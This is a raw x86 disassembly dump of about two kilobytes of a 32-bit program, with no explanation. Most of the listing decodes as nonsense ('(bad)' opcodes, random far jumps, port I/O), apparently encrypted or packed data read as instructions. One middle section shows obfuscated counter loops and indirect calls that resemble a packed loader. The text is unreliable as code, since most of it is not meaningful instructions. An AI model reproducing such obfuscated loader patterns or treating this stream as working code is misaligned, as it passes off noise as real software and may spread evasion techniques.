  40a973:	(bad)  
  40a974:	(bad)  
  40a975:	jle    0x40a9cc
  40a977:	or     al,0x8d
  40a979:	jmp    0x40a930
  40a97b:	shr    BYTE PTR [edx+eax*2-0x5b2dac8f],0x55
  40a983:	das    
  40a984:	mov    bh,0x82
  40a986:	out    dx,al
  40a987:	jmp    0xd2aef788
  40a98c:	push   cx
  40a98e:	xchg   ebp,eax
  40a98f:	(bad)  
  40a990:	idiv   BYTE PTR [ebp+0x2e]
  40a993:	push   esp
  40a994:	in     al,0x13
  40a996:	or     eax,0x29b8a09c
  40a99b:	sbb    eax,0xc91d7038
  40a9a0:	and    cl,0xf
  40a9a3:	loopne 0x40a93e
  40a9a5:	sub    al,bh
  40a9a7:	out    dx,eax
  40a9a8:	mov    DWORD PTR [ebp-0x1d],esi
  40a9ab:	mov    ebp,0x94c09538
  40a9b0:	retf   
  40a9b1:	push   ss
  40a9b2:	add    ecx,eax
  40a9b4:	fidivr DWORD PTR [edx-0x5688e3e9]
  40a9ba:	int    0xf6
  40a9bc:	ret    
  40a9bd:	les    esp,FWORD PTR [esi-0x9b52e25]
  40a9c3:	sub    al,0xd4
  40a9c5:	jl     0x40a97f
  40a9c7:	popf   
  40a9c8:	fiadd  WORD PTR [ebx-0x52]
  40a9cb:	mov    ebx,0x69e9a9ab
  40a9d0:	pop    eax
  40a9d1:	xchg   DWORD PTR [edx],eax
  40a9d3:	mov    dl,0x7f
  40a9d5:	leave  
  40a9d6:	call   0x3f7a1c58
  40a9db:	dec    BYTE PTR [edx+0x55b4156d]
  40a9e1:	(bad)  
  40a9e2:	lahf   
  40a9e3:	es lock pop ss
  40a9e6:	jl     0x40aa31
  40a9e8:	test   BYTE PTR [ecx],ch
  40a9ea:	repz mov ch,0x8d
  40a9ed:	loope  0x40a9fe
  40a9ef:	or     DWORD PTR [edi],esp
  40a9f1:	lds    ebx,FWORD PTR [ecx+0x2d5d9980]
  40a9f7:	les    edi,FWORD PTR [ecx-0x7f0eb0cb]
  40a9fd:	add    BYTE PTR [edx],dl
  40a9ff:	(bad)  
  40aa00:	neg    DWORD PTR [esi+0x70]
  40aa03:	test   DWORD PTR [ebp+0x7dd299f],edi
  40aa09:	xchg   ebx,eax
  40aa0a:	aas    
  40aa0b:	cmp    eax,0x731d7da5
  40aa10:	stos   DWORD PTR es:[edi],eax
  40aa11:	mov    dh,0xbd
  40aa13:	sbb    dl,cl
  40aa15:	lds    esp,FWORD PTR ds:0x7fc1139a
  40aa1b:	lods   eax,DWORD PTR ds:[esi]
  40aa1c:	retf   
  40aa1d:	jp     0x40aa3d
  40aa1f:	enter  0xfbbe,0xe1
  40aa23:	scas   al,BYTE PTR es:[edi]
  40aa24:	xchg   esp,eax
  40aa25:	jge    0x40aa0d
  40aa27:	add    ebx,ecx
  40aa29:	shl    cl,1
  40aa2b:	js     0x40aa70
  40aa2d:	ror    DWORD PTR [edx+0x2e4be5a3],1
  40aa33:	call   0xca38:0xcf772161
  40aa3a:	xor    al,0x93
  40aa3c:	adc    ebx,ebx
  40aa3e:	xchg   esi,eax
  40aa3f:	clc    
  40aa40:	ret    
  40aa41:	pop    esi
  40aa42:	gs add ax,0xd28a
  40aa47:	xchg   esi,eax
  40aa48:	sbb    ebp,DWORD PTR [ecx-0x75403579]
  40aa4e:	bound  dx,DWORD PTR [ecx]
  40aa51:	jne    0x40aa87
  40aa53:	int    0x45
  40aa55:	fstp   QWORD PTR [edi+0x48bdfd94]
  40aa5b:	fcomp  DWORD PTR [ebp-0x1ef26a4]
  40aa61:	addps  xmm0,XMMWORD PTR [esp+edi*8]
  40aa65:	adc    bh,BYTE PTR [edx]
  40aa67:	push   ebx
  40aa68:	int    0x54
  40aa6a:	pop    ds
  40aa6b:	leave  
  40aa6c:	inc    esi
  40aa6d:	test   DWORD PTR [edi-0x70],edi
  40aa70:	inc    ecx
  40aa71:	dec    ebx
  40aa72:	cli    
  40aa73:	test   BYTE PTR [ecx-0x47],bl
  40aa76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa77:	fcmovnu st,st(0)
  40aa79:	or     DWORD PTR [ebx+0x45],ebx
  40aa7c:	leave  
  40aa7d:	mov    ebx,0xee57839a
  40aa82:	mov    WORD PTR [ebx],es
  40aa84:	mov    esp,0x54295275
  40aa89:	repz pop esp
  40aa8b:	pop    esi
  40aa8c:	enter  0x6e5d,0xdb
  40aa90:	retf   
  40aa91:	mov    ds:0x2a5cbf5a,al
  40aa96:	adc    bl,BYTE PTR [edx+0x77]
  40aa99:	or     al,0x7c
  40aa9b:	cmp    BYTE PTR [edx],dh
  40aa9d:	or     edi,DWORD PTR es:[eax+0x1]
  40aaa1:	pop    edi
  40aaa2:	loope  0x40ab16
  40aaa4:	mov    edi,0x97b3b7e9
  40aaa9:	add    al,0xb2
  40aaab:	sub    DWORD PTR [ebp+0x28],edi
  40aaae:	mov    dh,0xe8
  40aab0:	retf   
  40aab1:	mov    ebp,gs
  40aab3:	cmp    eax,0xce5ded35
  40aab8:	fwait
  40aab9:	sahf   
  40aaba:	cld    
  40aabb:	mov    ds:0x225c8103,al
  40aac0:	dec    esp
  40aac1:	(bad)  
  40aac2:	or     edi,DWORD PTR [ebx+eiz*8-0x2990dbef]
  40aac9:	ret    
  40aaca:	jb     0x40aae3
  40aacc:	inc    ebx
  40aacd:	inc    ecx
  40aace:	outs   dx,BYTE PTR ds:[esi]
  40aacf:	jmp    0x3368c309
  40aad4:	xchg   esi,eax
  40aad5:	ficom  DWORD PTR [edi+0x48]
  40aad8:	pop    esp
  40aad9:	pop    esi
  40aada:	mov    WORD PTR [edi-0x7e],es
  40aadd:	sub    BYTE PTR [esi+0x37],bl
  40aae0:	and    al,0x8e
  40aae2:	jle    0x40aa68
  40aae4:	fadd   DWORD PTR [edi+0x1ceeb0b0]
  40aaea:	pushf  
  40aaeb:	add    ch,BYTE PTR [ebx+0x53d0d01c]
  40aaf1:	or     al,0x7b
  40aaf3:	rcl    DWORD PTR [edi],1
  40aaf5:	xchg   BYTE PTR [ebp-0xd],al
  40aaf8:	pushf  
  40aaf9:	add    edx,esp
  40aafb:	jp     0x40ab6d
  40aafd:	pop    ss
  40aafe:	inc    esi
  40aaff:	outs   dx,BYTE PTR ds:[esi]
  40ab00:	sbb    eax,0x9e5206bc
  40ab05:	sub    edi,DWORD PTR [edi+0x7d]
  40ab08:	out    0x8c,al
  40ab0a:	(bad)  
  40ab0b:	nop
  40ab0c:	pusha  
  40ab0d:	(bad)  
  40ab0e:	cmp    esi,DWORD PTR [ebx]
  40ab10:	sbb    al,0xe2
  40ab12:	out    0x8c,al
  40ab14:	retf   
  40ab15:	bound  ecx,QWORD PTR [ebx]
  40ab17:	pop    esi
  40ab18:	or     BYTE PTR [ebp+esi*1-0x2f],cl
  40ab1c:	mov    cl,0x6b
  40ab1e:	mov    dh,0x47
  40ab20:	push   ss
  40ab21:	arpl   WORD PTR [ecx],sp
  40ab23:	ror    BYTE PTR [esi-0x1a],cl
  40ab26:	fcomp  DWORD PTR [ecx+0x195fc9c6]
  40ab2c:	xchg   ecx,eax
  40ab2d:	ss xchg esp,eax
  40ab2f:	mov    eax,0x3a6ba3a
  40ab34:	pop    edi
  40ab35:	pop    ds
  40ab36:	cmp    cl,0xd9
  40ab39:	(bad)  [eax]
  40ab3b:	xchg   esp,eax
  40ab3c:	loop   0x40ab4d
  40ab3e:	sbb    eax,0x820cd87d
  40ab43:	sub    cl,BYTE PTR [edi]
  40ab45:	sbb    ebx,edi
  40ab47:	and    al,0x5f
  40ab49:	cwde   
  40ab4a:	addr16 je 0x40aba6
  40ab4d:	out    dx,al
  40ab4e:	dec    ebp
  40ab4f:	mov    cl,0xd8
  40ab51:	rcr    bh,1
  40ab53:	test   DWORD PTR [edx+edi*2-0x7b],edi
  40ab57:	ds in  al,0x1b
  40ab5a:	arpl   cx,di
  40ab5c:	sbb    al,0xfd
  40ab5e:	test   ecx,ebx
  40ab60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab61:	pusha  
  40ab62:	xor    eax,0xf765575c
  40ab67:	jmp    0x40aaf6
  40ab69:	dec    ecx
  40ab6a:	adc    esp,esp
  40ab6c:	ds jmp 0xc6d4:0x35f849cf
  40ab74:	inc    edi
  40ab75:	sbb    eax,0x61477d13
  40ab7a:	xor    DWORD PTR [edx-0x407298b2],0x7edd737
  40ab84:	(bad)  
  40ab85:	test   BYTE PTR [ebp+0x56477c44],0x76
  40ab8c:	dec    ebx
  40ab8d:	popf   
  40ab8e:	out    0xbd,eax
  40ab90:	or     dl,BYTE PTR [ecx+0x2fb07c45]
  40ab96:	jp     0x40ab5b
  40ab98:	aad    0x32
  40ab9a:	mov    edx,tr5
  40ab9d:	xor    BYTE PTR [edx+0x13],dh
  40aba0:	pop    es
  40aba1:	outs   dx,DWORD PTR ds:[esi]
  40aba2:	adc    ecx,ebx
  40aba4:	push   0x18
  40aba6:	dec    eax
  40aba7:	nop
  40aba8:	icebp  
  40aba9:	int    0x8b
  40abab:	sub    BYTE PTR [edx+0x79],al
  40abae:	outs   dx,BYTE PTR ds:[esi]
  40abaf:	pop    edi
  40abb0:	or     al,0x3f
  40abb2:	enter  0x96e9,0xea
  40abb6:	outs   dx,DWORD PTR ds:[esi]
  40abb7:	or     esp,DWORD PTR [ecx-0x69]
  40abba:	push   ebp
  40abbb:	pop    edx
  40abbc:	sub    DWORD PTR [esi-0x7aeac49],esi
  40abc2:	and    ecx,DWORD PTR [ebx+0x7c]
  40abc5:	(bad)  
  40abc6:	(bad)  
  40abc7:	mov    ebp,0x6cc9d594
  40abcc:	nop
  40abcd:	mov    eax,0x2094fcfe
  40abd2:	cs stc 
  40abd4:	fcom   DWORD PTR [edx]
  40abd6:	out    0xe9,eax
  40abd8:	cwde   
  40abd9:	cs mov ch,0x7d
  40abdc:	push   edx
  40abdd:	(bad)  
  40abde:	jmp    0xde783fbf
  40abe3:	and    bh,bl
  40abe5:	js     0x40ab8a
  40abe7:	rcl    DWORD PTR [ebp+0x34],cl
  40abea:	push   ebp
  40abeb:	(bad)
  40abee:	mov    ebx,0x7b967c5f
  40abf3:	add    BYTE PTR [edx],ch
  40abf5:	je     0x40ac2b
  40abf7:	sbb    eax,0xb824a496
  40abfc:	mov    ch,0xde
  40abfe:	test   DWORD PTR [esi],esi
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fdf5,0x42e80f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e803,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fddd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fe7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fdf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e7f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e7f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e33d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e3f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e7f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e7f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e228,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e228
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e228,ebx
  40acad:	cmp    DWORD PTR ds:0x42e228,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e228,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e3f7
  40acd5:	cmp    DWORD PTR ds:0x42e228,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e228
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e228,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e234
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fde1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fde1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fde1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fe01
  40ad3c:	call   DWORD PTR ds:0x42e64b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fde1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fde1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad4d
  40adb4:	fucomi st,st(0)
  40adb6:	out    0x3,al
  40adb8:	std    
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad5a
  40adc0:	loop   0x40add4
  40adc2:	lock fidivr DWORD PTR [ebx+ebp*4-0x6b292aa3]
  40adca:	jae    0x40ad5a
  40adcc:	push   es
  40adcd:	cmp    DWORD PTR [edx-0x37fcbc8e],esp
  40add3:	imul   eax,DWORD PTR [ecx+0x3e],0xffffffb7
  40add7:	daa    
  40add8:	ss out 0x42,eax
  40addb:	xlat   BYTE PTR ds:[ebx]
  40addc:	arpl   WORD PTR [eax],ax
  40adde:	outs   dx,BYTE PTR ds:[esi]
  40addf:	jae    0x40ada8
  40ade1:	outs   dx,BYTE PTR ds:[esi]
  40ade2:	out    dx,eax
  40ade3:	cli    
  40ade4:	pusha  
  40ade5:	in     al,dx
  40ade6:	pop    edi
  40ade7:	cmp    esi,0x2b2f234c
  40aded:	(bad)  
  40adee:	in     al,dx
  40adef:	ins    DWORD PTR es:[edi],dx
  40adf0:	xchg   ebp,eax
  40adf1:	or     esp,DWORD PTR [ecx+ebx*8-0xd]
  40adf5:	mov    bl,0xd
  40adf7:	mov    bl,0x23
  40adf9:	outs   dx,DWORD PTR ds:[esi]
  40adfa:	xchg   DWORD PTR [bx+si],ecx
  40adfd:	(bad)  
  40adff:	nop
  40ae00:	inc    bh
  40ae02:	or     BYTE PTR [esp+eiz*8+0x63],bh
  40ae06:	inc    edi
  40ae07:	add    DWORD PTR [edi+esi*8],ecx
  40ae0a:	adc    BYTE PTR [esi],dh
  40ae0c:	xchg   esi,eax
  40ae0d:	pop    ss
  40ae0e:	stc    
  40ae0f:	jbe    0x40ae08
  40ae11:	cmp    al,0x60
  40ae13:	lahf   
  40ae14:	or     edx,DWORD PTR [edi]
  40ae16:	fcom   QWORD PTR [esi-0x26660116]
  40ae1c:	lahf   
  40ae1d:	mov    ch,dl
  40ae1f:	and    ah,ch
  40ae21:	mov    esp,0x7920a899
  40ae26:	jne    0x40adc0
  40ae28:	fadd   QWORD PTR [eax-0x61f20320]
  40ae2e:	in     eax,dx
  40ae2f:	or     al,0x7f
  40ae31:	push   ebx
  40ae32:	into   
  40ae33:	rcr    DWORD PTR [ecx],0x92
  40ae36:	xchg   ecx,eax
  40ae37:	inc    ebx
  40ae38:	call   0xcad8:0x39435b84
  40ae3f:	fdivr  st(6),st
  40ae41:	jmp    0x40ae90
  40ae43:	pop    edx
  40ae44:	xor    al,0x7e
  40ae46:	jecxz  0x40aebb
  40ae48:	jp     0x40ade0
  40ae4a:	addr16 sahf 
  40ae4c:	daa    
  40ae4d:	mov    ds:0x1f2340c2,al
  40ae52:	in     eax,0x5e
  40ae54:	push   0xa8580bc5
  40ae59:	fsub   DWORD PTR [ecx-0x5260ba4d]
  40ae5f:	or     al,0x12
  40ae61:	rcl    DWORD PTR [edi],cl
  40ae63:	sbb    dh,dh
  40ae65:	dec    edi
  40ae66:	leave  
  40ae67:	add    al,0xa8
  40ae69:	add    esp,DWORD PTR [esi*2-0x15c9fe52]
  40ae70:	pushf  
  40ae71:	add    DWORD PTR [ecx-0x42],ebx
  40ae74:	(bad)  
  40ae75:	and    DWORD PTR [ebp+0x49],edx
  40ae78:	in     al,0x5d
  40ae7a:	out    dx,eax
  40ae7b:	hlt    
  40ae7c:	jne    0x40ae85
  40ae7e:	sub    ebx,esp
  40ae80:	xchg   BYTE PTR [ecx-0x1a1d9254],bh
  40ae86:	cmp    bl,BYTE PTR [edi-0x4ebccf6b]
  40ae8c:	mov    cl,0x23
  40ae8e:	ds call 0x45fbfa08
  40ae94:	jmp    0x3a7f:0x17c267f9
  40ae9b:	pop    esi
  40ae9c:	xchg   esp,eax
  40ae9d:	sahf   
  40ae9e:	loop   0x40af1b
  40aea0:	pop    ebx
  40aea1:	ds push esi
  40aea3:	pop    ebp
  40aea4:	mov    dl,BYTE PTR [eax+eax*8+0x12]
  40aea8:	shl    DWORD PTR [ecx-0x47],0x65
  40aeac:	stos   BYTE PTR es:[edi],al
  40aead:	imul   ebx,DWORD PTR [ecx],0x21
  40aeb0:	clc    
  40aeb1:	mov    ebx,0x2099a2b3
  40aeb6:	out    dx,al
  40aeb7:	mov    bh,BYTE PTR [ebx+ebp*4+0xd1a9ebf]
  40aebe:	ret    
  40aebf:	(bad)  
  40aec0:	jp     0x40af40
  40aec2:	xchg   edi,eax
  40aec3:	idiv   BYTE PTR [ebp-0x3b9cb7a2]
  40aec9:	lods   eax,DWORD PTR ds:[esi]
  40aeca:	pop    eax
  40aecb:	das    
  40aecc:	pushf  
  40aecd:	es mov bl,0xcf
  40aed0:	mov    ch,0x97
  40aed3:	lods   al,BYTE PTR ds:[esi]
  40aed4:	test   al,0xcb
  40aed6:	aam    0x8e
  40aed8:	outs   dx,DWORD PTR ds:[esi]
  40aed9:	daa    
  40aeda:	mov    eax,ds:0x94a9c37a
  40aedf:	jecxz  0x40aeb7
  40aee1:	mov    edx,0x221ed7b8
  40aee6:	sbb    eax,0xf151cc0c
  40aeeb:	inc    eax
  40aeec:	or     eax,0xdf0f83c8
  40aef1:	(bad)  
  40aef2:	sbb    esi,DWORD PTR [edx-0x19]
  40aef5:	mov    bl,cl
  40aef7:	add    eax,0x486bb813
  40aefc:	nop
  40aefd:	jb     0x40aef1
  40aeff:	ja     0x40af6a
  40af01:	jne    0x40aeaf
  40af03:	hlt    
  40af04:	mov    es,edi
  40af06:	or     al,0x4b
  40af08:	xor    al,0xd1
  40af0a:	dec    edx
  40af0b:	sbb    DWORD PTR ds:0x2b1a45b5,0xfc5a5572
  40af15:	hlt    
  40af16:	push   cs
  40af17:	mov    ebx,0xaaf36e1f
  40af1c:	(bad)  
  40af1d:	fs dec ebp
  40af1f:	mov    ebx,0xd3594663
  40af24:	dec    ebx
  40af25:	(bad)  
  40af26:	(bad)  
  40af27:	jecxz  0x40aea9
  40af29:	outs   dx,BYTE PTR ds:[esi]
  40af2a:	mov    ds:0x50eb58f,al
  40af2f:	cmp    ah,BYTE PTR es:[ebx-0x67]
  40af33:	or     DWORD PTR [edi+edi*8-0x48],0xffffffad
  40af38:	jg     0x40aef0
  40af3a:	(bad)  
  40af3b:	adc    DWORD PTR [edi-0x454469d2],0xe7823f69
  40af45:	xchg   esi,eax
  40af46:	jnp    0x40af5b
  40af48:	add    eax,0xaffef2e8
  40af4d:	fs xchg ebx,eax
  40af4f:	dec    eax
  40af50:	int    0x6a
  40af52:	fidivr DWORD PTR [edi+eiz*8+0x7]
  40af56:	bound  ebp,QWORD PTR [ebx+0xd45f3c1]
  40af5c:	test   al,0xde
  40af5e:	ins    DWORD PTR es:[edi],dx
  40af5f:	(bad)  
  40af60:	fnstsw WORD PTR [ecx]
  40af62:	std    
  40af63:	fsub   QWORD PTR [eax+edi*1]
  40af66:	inc    ebx
  40af67:	jns    0x40aef2
  40af69:	push   esp
  40af6a:	jp     0x40af89
  40af6c:	lea    ebp,[eax-0x6377eead]
  40af72:	adc    al,0xcf
  40af74:	xchg   ebx,eax
  40af75:	shr    DWORD PTR [ebx],1
  40af77:	into   
  40af78:	xchg   ecx,eax
  40af79:	jns    0x40afc9
  40af7b:	aad    0xad
  40af7d:	push   ss
  40af7e:	out    dx,al
  40af7f:	adc    edi,ebx
  40af81:	shr    BYTE PTR [eax-0x6b],0x26
  40af85:	dec    edx
  40af86:	jno    0x40af19
  40af88:	jmp    0x2b169167
  40af8d:	out    0x43,eax
  40af8f:	push   0x4dccf1cf
  40af94:	mov    bl,0x4f
  40af96:	sbb    DWORD PTR [ecx-0x401f9b19],esi
  40af9c:	jnp    0x40afd1
  40af9e:	add    eax,0xbdd78b66
  40afa3:	adc    edi,DWORD PTR [ebp+0x89ac1c6]
  40afa9:	mov    eax,0x303f5288
  40afae:	jmp    0x4930daf5
  40afb3:	in     eax,dx
  40afb4:	imul   ebp,eax,0xd5944848
  40afba:	pop    edi
  40afbb:	cmp    eax,0x744894c0
  40afc0:	pop    edx
  40afc1:	push   esi
  40afc2:	dec    DWORD PTR ds:0x3dadb05c
  40afc8:	and    eax,0x9d9e84b1
  40afcd:	test   eax,0x5f49d1b6
  40afd2:	jb     0x40af7e
  40afd4:	jnp    0x40afab
  40afd6:	lods   al,BYTE PTR ds:[esi]
  40afd7:	fdivr  st(1),st
  40afd9:	xor    dh,BYTE PTR [ecx-0x15fa9477]
  40afdf:	test   al,0x2f
  40afe1:	outs   dx,DWORD PTR ds:[si]
  40afe3:	cmp    dl,dl
  40afe5:	mov    al,ds:0xf3709e61
  40afea:	je     0x40b043
  40afec:	pop    edx
  40afed:	sbb    esp,DWORD PTR [ebp-0x3a05ec5]
  40aff3:	jmp    0x40afa9
  40aff5:	fiadd  WORD PTR [esi]
  40aff7:	xor    eax,0x7efa5240
  40affc:	pushf  
  40affd:	jle    0x40b048
  40afff:	inc    esi
  40b000:	aaa    
  40b001:	ins    BYTE PTR es:[edi],dx
  40b002:	add    eax,DWORD PTR [edx+0x2810bf83]
  40b008:	or     DWORD PTR [esi*4-0x7ceca532],esi
  40b00f:	je     0x40afb0
  40b011:	sbb    esp,esp
  40b013:	fimul  WORD PTR [edx-0x6a7b6a0f]
  40b019:	int    0x45
  40b01b:	sub    al,0x36
  40b01d:	inc    eax
  40b01e:	in     al,0xef
  40b020:	stos   DWORD PTR es:[edi],eax
  40b021:	(bad)  
  40b022:	out    0x49,eax
  40b024:	mov    eax,0x6b052d1a
  40b029:	out    0x73,al
  40b02b:	add    esi,DWORD PTR [ecx]
  40b02d:	out    0xe0,eax
  40b02f:	enter  0x5281,0x43
  40b033:	minps  xmm7,XMMWORD PTR ds:0x6ba8a718
  40b03a:	xor    cl,ch
  40b03c:	in     eax,dx
  40b03d:	adc    edi,DWORD PTR [edx+0x61e7a322]
  40b043:	push   0x6187344e
  40b048:	push   0xffffff8d
  40b04a:	mov    ebx,ecx
  40b04c:	sub    eax,0xf4453940
  40b051:	push   edx
  40b052:	lds    esp,FWORD PTR es:[ebp-0xa6f5345]
  40b059:	xlat   BYTE PTR ds:[ebx]
  40b05a:	inc    dh
  40b05c:	daa    
  40b05d:	cmp    esp,ebx
  40b05f:	jne    0x40b04b
  40b061:	das    
  40b062:	add    dh,BYTE PTR [ebx]
  40b064:	(bad)  
  40b066:	pop    es
  40b067:	mov    bl,0x10
  40b069:	ins    BYTE PTR es:[edi],dx
  40b06a:	retf   0x2378
  40b06d:	mov    ds:0x792c2e65,al
  40b072:	pop    esi
  40b073:	aad    0x9a
  40b075:	fidivr DWORD PTR [edi+ecx*2-0x3a0a1f7c]
  40b07c:	jl     0x40b09b
  40b07e:	dec    eax
  40b07f:	(bad)  
  40b080:	nop
  40b081:	xor    eax,0x7078d699
  40b086:	add    DWORD PTR [ebp-0x63b74b02],esp
  40b08c:	das    
  40b08d:	push   es
  40b08e:	out    dx,al
  40b08f:	mov    WORD PTR gs:[eax],cs
  40b092:	ins    BYTE PTR es:[edi],dx
  40b093:	shl    BYTE PTR [ecx+0x2],cl
  40b096:	push   0xffffff98
  40b098:	mov    BYTE PTR [eax-0x745f4b43],dl
  40b09e:	or     cl,BYTE PTR [edx]
  40b0a0:	xchg   edx,eax
  40b0a1:	jmp    0x40b0fc
  40b0a3:	jnp    0x40b0b3
  40b0a5:	leave  
  40b0a6:	test   DWORD PTR [esi],esp
  40b0a8:	lods   eax,DWORD PTR ds:[esi]
  40b0a9:	ror    DWORD PTR ss:[ecx-0x450abbc7],cl
  40b0b0:	adc    DWORD PTR [esi+0x61],edi
  40b0b3:	icebp  
  40b0b4:	lock mov ds:0x270a8c8d,al
  40b0ba:	pop    ss
  40b0bb:	cld    
  40b0bc:	mov    bh,0x50
  40b0be:	push   ss
  40b0bf:	ja     0x40b0fb
  40b0c1:	mov    ch,0x3a
  40b0c3:	mov    esp,0x88e9ba46
  40b0c8:	shr    DWORD PTR [edi+0x7f65a0bf],cl
  40b0ce:	inc    ebp
  40b0cf:	or     eax,0x28f6b550
  40b0d4:	add    eax,ecx
  40b0d6:	inc    esp
  40b0d7:	sar    DWORD PTR [esi+0x6b],0x86
  40b0db:	fdivr  DWORD PTR [esi-0x5781f0a9]
  40b0e1:	mov    dh,0x59
  40b0e3:	jo     0x40b13b
  40b0e5:	retf   0x332f
  40b0e8:	xchg   edx,eax
  40b0e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ea:	repnz ins DWORD PTR es:[edi],dx
  40b0ec:	push   0xffffffa2
  40b0ee:	xchg   edx,eax
  40b0ef:	call   0x4886:0xe0cc07e7
  40b0f6:	stc    
  40b0f7:	sub    ch,al
  40b0f9:	daa    
  40b0fa:	test   DWORD PTR [edx+0x46],esp
  40b0fd:	cmp    ebx,DWORD PTR [edi]
  40b0ff:	pushf  
  40b100:	pop    DWORD PTR [edi+ecx*8-0x12]
  40b104:	add    esp,DWORD PTR [ebx-0x42]
  40b107:	imul   ecx,edi,0xffffff98
  40b10a:	test   eax,0xd7a480d
  40b10f:	outs   dx,DWORD PTR ds:[esi]
  40b110:	xor    BYTE PTR ds:0xb74b6634,cl
  40b116:	gs (bad) 
  40b118:	(bad)  
  40b119:	cld    
  40b11a:	adc    esi,ecx
  40b11c:	push   ebx
  40b11d:	pop    ecx
  40b11e:	les    ebp,FWORD PTR [eax]
  40b120:	icebp  
  40b121:	data16 add BYTE PTR [ebx+0x61],dl
  40b125:	outs   dx,BYTE PTR ds:[esi]
  40b126:	or     ebp,DWORD PTR [ebp-0x70]
  40b129:	and    BYTE PTR [edx+ebx*4],dh
  40b12c:	hlt    
  40b12d:	inc    esi
  40b12e:	and    eax,DWORD PTR [esi+0x1e]
  40b131:	out    0x74,eax
  40b133:	jo     0x40b11f
  40b135:	adc    DWORD PTR [edi],edx
  40b137:	dec    esi
  40b138:	jle    0x40b17b
  40b13a:	jge    0x40b1a6
  40b13c:	jmp    0x96883600
  40b141:	aad    0xe5
  40b143:	mov    ecx,0xc80debb5
  40b148:	pmaddwd mm7,QWORD PTR [edx+0x37a42e2f]
  40b14f:	fist   WORD PTR [edi+0x54159809]
  40b155:	and    eax,ecx
  40b157:	lock test DWORD PTR [esi-0x48ccb3d],0xd1037803
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	inc    esp
  40b174:	pop    ecx
  40b175:	cmp    cl,BYTE PTR [edi]
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b188
  40b180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b181:	jg     0x40b1fd
  40b183:	jns    0x40b119
  40b185:	pop    edx
  40b186:	leave  
